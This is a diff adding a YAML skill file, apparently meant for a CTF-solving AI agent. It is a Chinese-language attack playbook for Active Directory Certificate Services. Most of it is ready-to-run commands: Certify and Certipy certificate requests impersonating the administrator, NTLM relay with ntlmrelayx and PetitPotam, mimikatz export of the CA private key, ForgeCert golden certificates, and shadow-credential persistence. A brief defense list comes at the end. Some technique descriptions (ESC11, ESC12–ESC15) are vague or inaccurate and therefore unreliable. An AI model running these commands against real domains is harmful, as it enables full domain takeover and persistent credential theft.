@@ -1,0 +1,344 @@
+name: adcs_attack
+description: ADCS证书服务攻击 - 涵盖Active Directory Certificate Services的完整攻击链，包括ESC1-ESC15各类证书模板滥用技术
+version: "2.0"
+author: CTF-Agent Team
+tags: [adcs, active-directory, certificate, esc, privilege-escalation]
+priority: high
+
+# 使用场景
+scenarios:
+  - AD域证书服务渗透测试
+  - ADCS证书模板漏洞利用
+  - 域内权限提升
+  - 黄金证书创建
+  - 持久化证书攻击
+
+# 核心技术
+techniques:
+  - ESC1: 证书模板配置错误，可申请任意用户证书
+  - ESC2: 证书模板无授权限制
+  - ESC3: 证书注册代理滥用
+  - ESC4: 证书模板ACL配置错误
+  - ESC5: PKI对象ACL配置错误
+  - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2配置
+  - ESC7: CA证书管理员权限滥用
+  - ESC8: AD CS Web Enrollment滥用
+  - ESC9/ESC10: NoSecurityExtension滥用
+  - ESC11: CEP加密滥用
+  - ESC12-ESC15: 新增证书攻击技术
+
+# 工具列表
+tools:
+  - Certify: ADCS漏洞检测与利用
+  - PSPKIAudit: PKI审计工具
+  - Certipy: ADCS攻击Python工具
+  - BloodyAD: AD证书攻击
+  - Rubeus: Kerberos证书利用
+  - mimikatz: 证书提取与利用
+  - certutil: Windows证书工具
+  - openssl: 证书处理
+
+# ADCS架构理解
+architecture:
+  components:
+    - Certificate Authority (CA): 证书颁发机构
+    - Certificate Templates: 证书模板
+    - Enrollment Services: 注册服务
+    - Web Enrollment: Web注册接口
+    - CEP/CES: 证书注册策略/服务
+
+  attack_surface:
+    - 证书模板配置
+    - CA配置
+    - PKI对象ACL
+    - 注册权限
+    - Web接口
+
+# ADCS信息收集
+reconnaissance:
+  - template: |
+      # ADCS环境信息收集
+
+      # 使用Certipy
+      certipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP'
+
+      # 使用Certify (C#)
+      Certify.exe find /domain:domain.local /dc:DC_IP
+
+      # 使用PowerShell
+      Get-ADObject -LDAPFilter "(objectClass=pKIEnrollmentService)"
+
+      # 检查CA配置
+      certutil -config "CA_NAME" -getreg "Policy\\EditFlags"
+
+      # 检查证书模板
+      certutil -CATemplates
+      Get-ADObject -LDAPFilter "(objectClass=pkicertificatetemplate)"
+
+# ESC1 - 证书模板滥用
+esc1:
+  - description: |
+      # ESC1: 低权限用户可申请包含任意SAN的证书
+
+      # 漏洞条件:
+      # 1. 模板允许低权限用户注册
+      # 2. 模板启用SAN扩展
+      # 3. ENROLLEE_SUPPLIES_SUBJECT属性设置
+      # 4. 模板可用于Client Authentication
+
+  - detection: |
+      # 检测ESC1漏洞
+
+      # Certify检测
+      Certify.exe find /vulnerable /currentuser
+
+      # Certipy检测
+      certipy find -vulnerable -u 'user@domain.local' -p 'password'
+
+      # 手动检查模板属性
+      Get-ADObject -LDAPFilter "(&(objectClass=pkicertificatetemplate)(msPKI-Enrollment-Flag=1))"
+
+  - exploitation: |
+      # ESC1利用
+
+      # 申请管理员证书
+      Certify.exe request /ca:'CA_SERVER\CA_NAME' /template:'VulnTemplate' /altname:'administrator'
+
+      # 使用Certipy
+      certipy req -u 'user@domain.local' -p 'password' \
+        -ca 'CA_NAME' -template 'VulnTemplate' -alt 'administrator@domain.local'
+
+      # 生成的PFX可用于认证
+      # 使用Rubeus进行PTK
+      Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pass
+
+      # 使用Certipy
+      certipy auth -pfx administrator.pfx -domain domain.local
+
+# ESC2 - 无授权限制
+esc2:
+  - description: |
+      # ESC2: 证书模板无有效用途限制
+
+      # 漏洞条件:
+      # 1. 模板允许低权限用户注册
+      # 2. pkiextendedkeyusage为空或包含Any Purpose
+
+  - exploitation: |
+      # ESC2利用 - 类似ESC1
+
+      Certify.exe request /ca:'CA_NAME' /template:'VulnTemplate' /altname:'administrator'
+
+# ESC3 - 注册代理滥用
+esc3:
+  - description: |
+      # ESC3: 证书注册代理权限滥用
+
+      # 漏洞条件:
+      # 1. 用户拥有Enrollment Agent权限
+      # 2. 可为其他用户申请证书
+
+  - exploitation: |
+      # ESC3利用
+
+      # 检查注册代理权限
+      Certify.exe find /enrollmentagents
+
+      # 为其他用户申请证书
+      Certify.exe request /ca:'CA_NAME' /template:'Template' /onbehalf:'DOMAIN\administrator' /enrollcert:'Agent.pfx'
+
+# ESC4 - 模板ACL配置错误
+esc4:
+  - description: |
+      # ESC4: 低权限用户可修改证书模板
+
+      # 漏洞条件:
+      # 1. 普通用户对证书模板有写入权限
+
+  - exploitation: |
+      # ESC4利用
+
+      # 修改模板配置为ESC1
+      Certify.exe settemplate /template:'TargetTemplate' /adds:true
+
+      # 然后申请证书
+      Certify.exe request /ca:'CA_NAME' /template:'TargetTemplate' /altname:'administrator'
+
+      # 恢复模板
+      Certify.exe settemplate /template:'TargetTemplate' /removes:true
+
+# ESC5 - PKI对象ACL错误
+esc5:
+  - description: |
+      # ESC5: PKI相关对象ACL配置错误
+
+      # 可利用对象:
+      # - CA服务器计算机对象
+      # - CA管理员组
+      # - PKI管理员组
+
+  - exploitation: |
+      # 检查PKI对象ACL
+      PSPKIAudit.exe -domain domain.local
+
+      # 利用ACL错误提升权限
+
+# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
+esc6:
+  - description: |
+      # ESC6: CA启用EDITF_ATTRIBUTESUBJECTALTNAME2标志
+
+      # 该标志允许在任意模板中指定SAN
+
+  - detection: |
+      # 检查CA配置
+      certutil -config "CA_NAME" -getreg "Policy\\EditFlags"
+      # 查找EDITF_ATTRIBUTESUBJECTALTNAME2
+
+  - exploitation: |
+      # 利用ESC6
+      Certify.exe request /ca:'CA_NAME' /template:'User' /altname:'administrator'
+
+# ESC7 - CA管理员权限
+esc7:
+  - description: |
+      # ESC7: 用户拥有CA管理员权限
+
+      # CA管理员可以:
+      # 1. 修改CA配置
+      # 2. 关闭SAN检查
+
+  - exploitation: |
+      # ESC7利用
+
+      # 关闭SAN检查
+      Certify.exe setcasecurityflags /ca:'CA_NAME' /remove:disableSanCheck
+
+      # 申请任意用户证书
+      Certify.exe request /ca:'CA_NAME' /template:'User' /altname:'administrator'
+
+# ESC8 - Web Enrollment滥用
+esc8:
+  - description: |
+      # ESC8: AD CS Web Enrollment接口攻击
+
+      # NTLM relay攻击到Web Enrollment
+
+  - exploitation: |
+      # ESC8 - NTLM Relay
+
+      # 设置Relay服务器
+      python ntlmrelayx.py -t https://CA_SERVER/certsrv/certfnsh.asp --adcs
+
+      # 触发NTLM认证
+      # 使用打印机bug或其他方式
+
+      # PetitPotam触发
+      python PetitPotam.py -attackdefault Relay_Server Target_Server
+
+# ESC9/ESC10 - NoSecurityExtension
+esc9_esc10:
+  - description: |
+      # ESC9/ESC10: NoSecurityExtension滥用
+
+      # 当模板设置了NoSecurityExtension时
+      # 证书中的用户对象SID可能被操纵
+
+  - exploitation: |
+      # 检查模板属性
+      # msPKI-Enrollment-Flag包含noSecurityExtension
+
+      # 利用方式取决于具体配置
+
+# ESC11 - CEP加密滥用
+esc11:
+  - description: |
+      # ESC11: CEP/CES加密要求绕过
+
+      # 当CEP不强制加密时，可relay攻击
+
+  - exploitation: |
+      # Relay到CES
+      python ntlmrelayx.py -t https://CA_SERVER/certsrv/ces -smb2support
+
+# ESC12-ESC15 - 新技术
+esc12_esc15:
+  - esc12:
+      description: |
+        # ESC12: 特定证书模板配置滥用
+
+  - esc13:
+      description: |
+        # ESC13: 组成员资格通过证书实现
+
+  - esc14:
+      description: |
+        # ESC14: 证书链信任滥用
+
+  - esc15:
+      description: |
+        # ESC15: 证书发布权限滥用
+
+# 黄金证书
+golden_certificate:
+  - template: |
+      # 黄金证书 - 持久化技术
+
+      # 1. 获取CA证书
+
+      mimikatz.exe crypto::certificates /export
+
+      # 2. 提取CA私钥
+
+      mimikatz.exe crypto::CA /export
+
+      # 3. 伪造任意用户证书
+
+      # 使用ForgeCert
+      ForgeCert.exe --CaCertPath ca.pfx --CaPrivateKeyPath key.pem \
+        --Subject 'CN=administrator' --SubjectAltName 'administrator@domain.local'
+
+      # 4. 使用伪造证书认证
+
+      Rubeus.exe asktgt /user:administrator /certificate:forge.pfx
+
+# Certipy完整攻击流程
+certipy_workflow:
+  - template: |
+      # Certipy ADCS攻击
+
+      # 1. 信息收集
+      certipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -vulnerable
+
+      # 2. 请求证书
+      certipy req -u 'user@domain.local' -p 'password' \
+        -ca 'CA_NAME' -template 'Template' -alt 'administrator'
+
+      # 3. 使用证书认证
+      certipy auth -pfx administrator.pfx -domain domain.local
+
+      # 4. 持久化
+      certipy shadow -u 'administrator@domain.local' -p 'password' -target 'Target_User'
+
+# 防御检测
+defense:
+  - 检测方法:
+      - 监控证书申请日志
+      - 检查异常SAN请求
+      - 审计PKI对象ACL
+      - 监控证书模板修改
+
+  - 修复建议:
+      - 审查所有证书模板配置
+      - 限制SAN扩展使用
+      - 加强PKI对象ACL
+      - 启用强证书映射
+      - 监控异常证书使用
+
+# 参考资源
+references:
+  - https://github.com/GhostPack/Certify
+  - https://github.com/ly4k/Certipy
+  - https://github.com/GhostPack/PSPKIAudit
+  - https://posts.specterops.io/certified-pre-owned
+  - https://adsecurity.org/?p=3775
